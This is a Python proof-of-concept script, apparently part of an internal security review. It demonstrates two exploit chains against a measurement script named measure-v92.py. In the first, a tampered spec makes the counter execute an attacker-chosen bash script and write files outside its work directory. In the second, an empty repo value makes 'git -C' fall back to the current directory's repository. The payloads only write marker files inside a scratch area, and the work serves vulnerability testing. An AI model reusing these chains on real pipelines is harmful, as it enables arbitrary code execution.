#!/usr/bin/env python3
"""T92SN1 probe 6 (final) — two exploit chains in the committed counter.

CHAIN A (spec-driven execution):  the counter's SPEC_SHA pin is a REPORTED
CONJUNCT, not a precondition.  The spec's gate.{repo,commit,path} and each
mutant's witness.{dirs,files} are used to (a) pick a repo/blob the counter
then EXECUTES with bash, and (b) create files outside --work.

CHAIN B (empty -C -> CWD repo):  measure-v92.py's git() helper runs
    ["git", "-C", repo, ...]
and `repo` comes from the spec (gate.repo) with NO emptiness check.  git
treats `-C ""` as "no directory change" and operates on the PROCESS CWD's
repository.  That is the 2026-11-06 fleet incident class
(`git -C ""` fell back to the fleet root).

Both are demonstrated against the committed bytes of measure-v92.py
(sha256 be5a9221...).  Every write lands under the seat's scratch dir; the
real lane and the real fleet repo are only READ.
"""
import hashlib, json, os, shutil, subprocess, sys, time

S = "/fast/scratch/hyaku/tameshi-r92/T92SN1"
LANE = "/home/vgpnk/Projects/shokunin/tameshi-shokunin"
COUNTER = os.path.join(LANE, ".ufo/evidence/round-92/c1/measure-v92.py")
SPEC_REL = ".ufo/evidence/round-92/c1/census-mutants.json"
W = os.path.join(S, "exec2")
shutil.rmtree(W, ignore_errors=True)
os.makedirs(W)


def mkrepo(path):
    os.makedirs(path, exist_ok=True)
    subprocess.run(["git", "init", "-q", path], check=True)
    subprocess.run(["git", "-C", path, "config", "user.name", "ctl"], check=True)
    subprocess.run(["git", "-C", path, "config", "user.email", "ctl@fixture.invalid"], check=True)
    return path


def commit(path, msg):
    subprocess.run(["git", "-C", path, "add", "-A"], check=True)
    subprocess.run(["git", "-C", path, "-c", "user.name=ctl", "-c", "user.email=ctl@fixture.invalid",
                    "commit", "-q", "-m", msg], check=True)
    return subprocess.run(["git", "-C", path, "rev-parse", "HEAD"],
                          capture_output=True, text=True).stdout.strip()


def make_lane_with_spec(spec_mutator, name):
    clone = os.path.join(W, name)
    subprocess.run(["git", "clone", "-q", "--shared", LANE, clone], check=True)
    subprocess.run(["git", "-C", clone, "checkout", "-q", "--detach",
                    "84904d41a31fb5ddde49e8bf1ad6fc2b489671a0"], check=True)
    sp = os.path.join(clone, SPEC_REL)
    spec = json.load(open(sp, encoding="utf-8"))
    spec["timeout_s"] = 15
    spec["runs_per_verdict"] = 1
    spec_mutator(spec)
    open(sp, "w", encoding="utf-8").write(json.dumps(spec, indent=1, ensure_ascii=False) + "\n")
    commit(clone, "unpinned spec")
    return clone, subprocess.run(["git", "-C", clone, "rev-parse", "HEAD"],
                                 capture_output=True, text=True).stdout.strip()


# ================= CHAIN A =================================================
MARKER = os.path.join(W, "PWNED_MARKER")
fakefleet = mkrepo(os.path.join(W, "fakefleet"))
os.makedirs(os.path.join(fakefleet, "scripts", "fixtures", "sources-census"), exist_ok=True)
open(os.path.join(fakefleet, "scripts", "fixtures", "sources-census", "keep"), "w").write("x\n")
evil = ("#!/bin/bash\n"
        "echo EXECUTED_SPEC_CHOSEN_SCRIPT >> %s\n" % MARKER +
        "case \"$1\" in selftest) echo 'selftest ok'; exit 0;; esac\n"
        "exit 0\n")
open(os.path.join(fakefleet, "scripts", "evil.sh"), "w").write(evil)
fc = commit(fakefleet, "fake gate")
ESC_DIR = os.path.join(W, "ESCAPED_DIR")
ESC_FILE = os.path.join(W, "ESCAPED_FILE.txt")


def mut_a(spec):
    spec["gate"]["repo"] = fakefleet
    spec["gate"]["commit"] = fc
    spec["gate"]["path"] = "scripts/evil.sh"
    spec["gate"]["sha256"] = hashlib.sha256(evil.encode()).hexdigest()
    for m in spec["mutants"]:
        if m["id"] == "C02":
            m["witness"] = dict(m["witness"])
            m["witness"]["dirs"] = [ESC_DIR]
            m["witness"]["files"] = [ESC_FILE]
            m["witness"]["sources"] = None


clone_a, rev_a = make_lane_with_spec(mut_a, "cloneA")
print("CHAIN A: clone rev", rev_a)
work_a = os.path.join(W, "workA"); os.makedirs(work_a)
p = subprocess.run([sys.executable, "-I", COUNTER, "--repo", clone_a, "--rev", rev_a, "--work", work_a],
                   capture_output=True, text=True, timeout=900)
print("  counter exit:", p.returncode)
print("  refused at setup?", "C1_SETUP" in p.stdout)
print("  spec conjunct:", [x for x in p.stdout.split() if x.startswith("spec=")])
print("  >> SPEC-CHOSEN SCRIPT EXECUTED?", os.path.exists(MARKER))
print("  >> witness wrote OUTSIDE --work? dir=%s file=%s" % (os.path.isdir(ESC_DIR), os.path.isfile(ESC_FILE)))

# ================= CHAIN B =================================================
print("\nCHAIN B: gate.repo == '' -> git -C '' -> process CWD repo")
cwdrepo = mkrepo(os.path.join(W, "cwdrepo"))
cwd_marker = os.path.join(W, "CWD_REPO_SCRIPT_RAN")
open(os.path.join(cwdrepo, "cwd-evil.sh"), "w").write(
    "#!/bin/bash\necho CWD_REPO_SCRIPT_RAN >> %s\ncase \"$1\" in selftest) echo 'selftest ok'; exit 0;; esac\nexit 0\n" % cwd_marker)
os.makedirs(os.path.join(cwdrepo, "scripts", "fixtures", "sources-census"), exist_ok=True)
open(os.path.join(cwdrepo, "scripts", "fixtures", "sources-census", "keep"), "w").write("x\n")
cwdcommit = commit(cwdrepo, "cwd repo")


def mut_b(spec):
    spec["gate"]["repo"] = ""            # <-- the empty variable
    spec["gate"]["commit"] = cwdcommit
    spec["gate"]["path"] = "cwd-evil.sh"
    spec["gate"]["sha256"] = hashlib.sha256(
        open(os.path.join(cwdrepo, "cwd-evil.sh"), "rb").read()).hexdigest()


clone_b, rev_b = make_lane_with_spec(mut_b, "cloneB")
print("  clone rev", rev_b)
work_b = os.path.join(W, "workB"); os.makedirs(work_b)
# process CWD = the scratch repo; git -C "" operates on THIS repo, not the lane
p2 = subprocess.run([sys.executable, "-I", COUNTER, "--repo", clone_b, "--rev", rev_b, "--work", work_b],
                    capture_output=True, text=True, timeout=900, cwd=cwdrepo)
print("  counter exit:", p2.returncode)
print("  refused at setup?", "C1_SETUP" in p2.stdout)
print("  >> CWD repo's script EXECUTED via git -C '' ?", os.path.exists(cwd_marker))
if os.path.exists(cwd_marker):
    print("     marker:", open(cwd_marker).read().strip())
print("  stdout head:", p2.stdout.split("\n")[0][:200] if p2.stdout else p2.stderr[:300])
